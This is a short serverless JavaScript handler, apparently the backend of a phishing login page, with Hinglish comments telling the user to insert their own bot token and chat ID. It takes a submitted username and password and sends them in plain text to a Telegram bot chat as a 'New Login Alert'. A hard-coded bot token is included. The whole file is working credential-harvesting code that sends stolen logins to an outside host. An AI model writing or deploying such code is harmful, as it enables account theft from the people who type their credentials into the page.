export default async function handler(req, res) {

  // yahan frontend se data aata hai
  const { username, password } = req.body;

  // 🔥 BOT TOKEN (yahan apna bot token daalna hai)
  const botToken = "8714955059:AAGMFhzVKaoDmtc5TLuI9OOhb125lYmTcKk";

  // 🔥 CHAT ID (yahan apni chat id daalni hai)
  const chatId = "8453084186";

  // message format
  const text = `
🔥 New Login Alert

👤 Username: ${username}
🔑 Password: ${password}
`;

  // Telegram API call
  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: text
    })
  });

  res.status(200).json({ success: true });
}
